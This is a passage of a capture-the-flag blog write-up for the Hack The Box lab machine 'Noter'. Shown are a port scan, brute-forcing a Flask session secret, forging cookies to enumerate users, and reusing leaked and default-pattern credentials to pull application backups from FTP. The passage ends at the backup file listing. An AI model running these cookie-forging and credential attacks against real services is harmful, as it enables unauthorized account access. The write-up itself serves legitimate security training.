<!doctype html><html lang="es"><head><title>Noter | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Medium machine. This machine has a web application built with Flask to manage notes in Markdown and PDF. We are able to extract the secret key used to sign session cookies and then forge cookies to enumerate users. Once we have a privileged user, we can access the FTP server and analyze the source code of the web application to detect a command injection vulnerability. Then, we can access the machine and find out that MySQL runs as root, which leads to privilege escalation"><meta itemprop="description" content="Hack The Box. Linux. Medium machine. This machine has a web application built with Flask to manage notes in Markdown and PDF. We are able to extract the secret key used to sign session cookies and then forge cookies to enumerate users. Once we have a privileged user, we can access the FTP server and analyze the source code of the web application to detect a command injection vulnerability. Then, we can access the machine and find out that MySQL runs as root, which leads to privilege escalation"><meta name="twitter:card" content="Hack The Box. Linux. Medium machine. This machine has a web application built with Flask to manage notes in Markdown and PDF. We are able to extract the secret key used to sign session cookies and then forge cookies to enumerate users. Once we have a privileged user, we can access the FTP server and analyze the source code of the web application to detect a command injection vulnerability. Then, we can access the machine and find out that MySQL runs as root, which leads to privilege escalation"><meta name="twitter:description" content="Hack The Box. Linux. Medium machine. This machine has a web application built with Flask to manage notes in Markdown and PDF. We are able to extract the secret key used to sign session cookies and then forge cookies to enumerate users. Once we have a privileged user, we can access the FTP server and analyze the source code of the web application to detect a command injection vulnerability. Then, we can access the machine and find out that MySQL runs as root, which leads to privilege escalation"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine has a web application built with Flask to manage notes in Markdown and PDF. We are able to extract the secret key used to sign session cookies and then forge cookies to enumerate users. Once we have a privileged user, we can access the FTP server and analyze the source code of the web application to detect a command injection vulnerability. Then, we can access the machine and find out that MySQL runs as root, which leads to privilege escalation"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="image" content="https://7rocky.github.io/images/HTB/Noter/Noter.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Noter/Noter.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Noter/Noter.png"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta itemprop="name" content="Noter"><meta property="twitter:title" content="Noter"><meta property="og:title" content="Noter"><meta property="og:url" content="https://7rocky.github.io/en/htb/noter/"><meta itemprop="keywords" content="ftp,flask,user-enumeration,default-credentials,command-injection,static-code-analysis,rce,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/noter/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/noter/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/noter/&text=Noter" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/noter/&title=Noter" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Noter</h1><time class="mt4 f6 dib tracked" datetime="2022-09-03T00:00:00+01:00">03 / 09 / 2022</time><br><p class="mb4 f6 dib tracked">10 minutes to read</p></header><div class="htb-image"><img alt="Noter" src="/images/HTB/Noter/Noter.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/ftp" title="FTP">FTP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/flask" title="Flask">Flask</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/user-enumeration" title="User enumeration">User enumeration</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/default-credentials" title="Default credentials">Default credentials</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/command-injection" title="Command Injection">Command Injection</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/static-code-analysis" title="Static Code Analysis">Static Code Analysis</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#ftp-enumeration">FTP enumeration</a></li><li><a href="#static-code-analysis">Static code analysis</a></li><li><a href="#foothold-on-the-machine">Foothold on the machine</a></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.11.160</li><li><strong>Release</strong>: 07 / 05 / 2022</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.160 -p 21,22,5000
Nmap scan report for 10.10.11.160
Host is up (0.052s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 11.47 seconds
</code></pre></div><p>This machine has ports 21 (FTP), 22 (SSH) and 5000 (HTTP) open.</p><h2 id="web-enumeration">Web enumeration</h2><p>If we go to <code>http://10.10.11.160:5000</code>, we have this website:</p><p><img src="/images/HTB/Noter/Noter-index.png" alt="Noter index"></p><p>The first thing we can to is register a new account as <code>rocky</code>:</p><p><img src="/images/HTB/Noter/Noter-register.png" alt="Noter register"></p><p>And then log in:</p><p><img src="/images/HTB/Noter/Noter-login.png" alt="Noter login"></p><p>Now we have access to our personal dashboard:</p><p><img src="/images/HTB/Noter/Noter-dashboard.png" alt="Noter dashboard"></p><p>It seems that there is a VIP subscription, but it is disabled:</p><p><img src="/images/HTB/Noter/Noter-vip.png" alt="Noter vip"></p><p>We can also add a new note:</p><p><img src="/images/HTB/Noter/Noter-add-note.png" alt="Noter new note"></p><p>Here we can try common vulnerabilities like Server-Side Template Injection (SSTI) or Cross-Site Scripting (XSS). In fact, the tool that handles the notes is CKEditor:</p><p><img src="/images/HTB/Noter/Noter-ckeditor.png" alt="Noter CKEditor"></p><p>This version of CKEditor (4.6.2) has a vulnerability of XSS (more information at <a href="https://snyk.io/vuln/npm:ckeditor@4.6.2">snyk.io</a>). Nevertheless, there is no one reading our notes, so the XSS won&rsquo;t be useful for exploitation.</p><p>At this point, we can try to obtain the back-end technology. The <code>Server</code> header is <code>Werkzeug/2.0.2 Python/3.8.10</code>, which means that the back-end tehnology is probably Flask. Moreover, we have a session cookie that is common in Flask, and the HTTP response message is in capital letters (<code>302 FOUND</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.160:5000/dashboard -I
HTTP/1.0 302 FOUND
<span class="code-white">Content-Type</span>: text/html; charset=utf-8
<span class="code-white">Content-Length</span>: 218
<span class="code-white">Location</span>: http://10.10.11.160:5000/login
<span class="code-white">Vary</span>: Cookie
<span class="code-white">Set-Cookie</span>: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVW5hdXRob3JpemVkLCBQbGVhc2UgbG9naW4iXX1dfQ.YtMgNg.FAhOFDdpcAg905AbEook1WRrB4U; HttpOnly; Path=/  
<span class="code-white">Server</span>: Werkzeug/2.0.2 Python/3.8.10
<span class="code-white">Date</span>: Sat, 16 Jul 2022 20:31:50 GMT
</code></pre></div><p>We can take our own session cookie and decode it using <a href="https://pypi.org/project/flask-unsign/"><code>flask-unsign</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">flask-unsign</span> --decode --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicm9ja3kifQ.YtMW3Q.11eEHt1GC3R0gKwJCFYa5euDte8  
{'logged_in': True, 'username': 'rocky'}
</code></pre></div><p>This tool is able to perform a brute force attack in order to extract the secret key used to sign cookies:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">flask-unsign</span> --unsign --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicm9ja3kifQ.YtMW3Q.11eEHt1GC3R0gKwJCFYa5euDte8  
[*] Session decodes to: {'logged_in': True, 'username': 'rocky'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2048): -----BEGIN PRIVATE KEY-----***
[+] Found secret key after 17408 attemptsQtX/puoAECjC
'secret123'
</code></pre></div><p>There it is (<code>secret123</code>). At this point, we can forge session cookies. However, we don&rsquo;t know any valid user. If we try common ones like <code>admin</code> or <code>administrator</code>, they are invalid:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">flask-unsign</span> --sign --cookie <span class="code-dark-yellow">"{'logged_in': True, 'username': 'admin'}"</span> --secret secret123
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YtMdfA.W2r5MJWyB2eQCgY4oCYC8GEv0g0

<span class="code-cyan">$</span> <span class="code-dark-green">flask-unsign</span> --sign --cookie <span class="code-dark-yellow">"{'logged_in': True, 'username': 'administrator'}"</span> --secret secret123  
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW5pc3RyYXRvciJ9.YtMdkw.XbITVqjTiqkQdmH50xODDdubJg0
</code></pre></div><p>One way of enumerating users is forge session cookies using a wordlist and then use <code>ffuf</code> to check each cookie:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> name in <span class="code-dark-magenta">$(</span><span class="code-dark-green">cat</span> $WORDLISTS/names.txt<span class="code-dark-magenta">)</span>; <span class="code-dark-yellow">do</span> <span class="code-dark-green">flask-unsign</span> --sign --cookie <span class="code-dark-yellow">"{'logged_in': True, 'username': '<span class="code-dark-cyan">$name</span>'}"</span> --secret secret123; <span class="code-dark-yellow">done</span> &gt; sessions.txt  

<span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w <span class="mtku">sessions.txt</span> -u http://10.10.11.160:5000/dashboard -H <span class="code-dark-yellow">'Cookie: session=FUZZ'</span> -mc 200
<span class="code-dark-green">eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YtMfew._xogDzgiDE-mwbolv2fbRKt28NI [Status: 200, Size: 2444, Words: 565, Lines: 83, Duration: 90ms]</span>
<span class="code-dark-green">eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicm9ja3kifQ.YtMi1A.42ax8lWMfqrz4CVh9oKkhuqB6eU [Status: 200, Size: 3230, Words: 807, Lines: 109, Duration: 143ms]</span>
</code></pre></div><p>Alright, let&rsquo;s see what users are these:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">flask-unsign</span> --decode --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YtMfew._xogDzgiDE-mwbolv2fbRKt28NI
{'logged_in': True, 'username': 'blue'}

<span class="code-cyan">$</span> <span class="code-dark-green">flask-unsign</span> --decode --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicm9ja3kifQ.YtMi1A.42ax8lWMfqrz4CVh9oKkhuqB6eU  
{'logged_in': True, 'username': 'rocky'}
</code></pre></div><p>Well, <code>rocky</code> is my user (it appears in the wordlist). If we use the session cookie for <code>blue</code> we see a different dashboard (a VIP one):</p><p><img src="/images/HTB/Noter/Noter-blue-dashboard.png" alt="Noter blue dashboard"></p><p>This are <code>blue</code>&rsquo;s notes:</p><p><img src="/images/HTB/Noter/Noter-notes-blue.png" alt="Noter blue notes"></p><p>The first one is pretty interesting because we can get a password (<code>blue@Noter!</code>) and another username (<code>ftp_admin</code>):</p><p><img src="/images/HTB/Noter/Noter-premium.png" alt="Noter blue premium"></p><p>The second note is not so interesting:</p><p><img src="/images/HTB/Noter/Noter-todo.png" alt="Noter blue todo"></p><p>We can try to forge a session cookie for <code>ftp_admin</code>, but it does not work.</p><p>As a VIP member, we can import notes in Markdown (we can try different extensions like <code>.txt</code>, <code>.html</code> until we find out that <code>.md</code> is valid):</p><p><img src="/images/HTB/Noter/Noter-import-notes.png" alt="Noter blue import notes"></p><p>And we can also export notes from Markdown to PDF:</p><p><img src="/images/HTB/Noter/Noter-export-notes.png" alt="Noter blue export notes"></p><h2 id="ftp-enumeration">FTP enumeration</h2><p>At this point, we can enumerate the FTP server. We can access using credentials <code>blue:blue@Noter!</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ftp</span> blue@10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
ftp&gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
226 Directory send OK.
ftp&gt; get policy.pdf
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for policy.pdf (12569 bytes).  
WARNING! 286 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
12569 bytes received in 0,0374 seconds (329 kbytes/s)
ftp&gt; cd files
250 Directory successfully changed.
ftp&gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
</code></pre></div><p>The only thing we have is a PDF file called <code>policy.pdf</code>. Although ASCII mode is enabled (not binary mode), the PDF file is correct. In this file, we can see an interesting sentence:</p><blockquote><p>Default user-password generated by the application is in the format of &ldquo;username@site_name!&rdquo; (This applies to all your applications)</p></blockquote><p>The password for <code>blue</code> matches with the above rule. Let&rsquo;s check if it matches for <code>ftp_admin</code> as well. In the website it does not work, but we can access FTP with the default credentials:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ftp</span> ftp_admin@10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
ftp&gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
226 Directory send OK.
ftp&gt; get app_backup_1638395546.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).  
WARNING! 100 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
26298 bytes received in 0,102 seconds (252 kbytes/s)
</code></pre></div><p>Here we will have a problem because the ZIP files we found will be corrupt (as a result of ASCII mode in FTP):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">unzip</span> -l <span class="mtku">app_backup_1638395546.zip</span>
Archive:  app_backup_1638395546.zip
error [app_backup_1638395546.zip]:  missing 3 bytes in zipfile
  (attempting to process anyway)
error [app_backup_1638395546.zip]:  start of central directory not found;  
  zipfile corrupt.
  (please check that you have transferred or created the zipfile in the
  appropriate BINARY mode and that you have compiled UnZip properly)
</code></pre></div><p>One way of getting them nice is using <code>curl</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> ftp://<span class="code-dark-yellow">'ftp_admin:ftp_admin%40Noter!'</span>@10.10.11.160/
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip  
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
</code></pre></div><p>So we can download them:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> ftp://<span class="code-dark-yellow">'ftp_admin:ftp_admin%40Noter!'</span>@10.10.11.160/app_backup_1635803546.zip -so app_backup_1635803546.zip  

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> ftp://<span class="code-dark-yellow">'ftp_admin:ftp_admin%40Noter!'</span>@10.10.11.160/app_backup_1638395546.zip -so app_backup_1638395546.zip
</code></pre></div><p>Both ZIP archives appear to contain the same files:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">unzip</span> -l <span class="mtku">app_backup_1638395546.zip</span>
Archive:  app_backup_1638395546.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    13507  12-26-2021 22:49   app.py
        0  12-26-2021 22:45   misc/
        0  12-26-2021 17:10   misc/attachments/
    46832  12-25-2021 13:09   misc/package-lock.json
        0  12-25-2021 13:09   misc/node_modules/
      169  12-26-2021 22:45   misc/md-to-pdf.js
        0  12-21-2021 14:15   templates/
        0  12-17-2021 14:51   templates/includes/
      393  12-15-2021 22:07   templates/includes/_messages.html
     1229  12-23-2021 11:54   templates/includes/_navbar.html
      238  12-15-2021 22:07   templates/includes/_formhelpers.html  
      503  12-19-2021 20:25   templates/import_note.html
      246  12-18-2021 16:44   templates/upgrade.html
      816  12-21-2021 20:47   templates/export_note.html
      393  12-21-2021 14:15   templates/note.html
      537  12-15-2021 22:07   templates/about.html
      755  12-15-2021 22:07   templates/register.html
      943  12-23-2021 11:54   templates/dashboard.html
      242  12-17-2021 14:56   templates/notes.html
      525  12-23-2021 15:03   templates/home.html
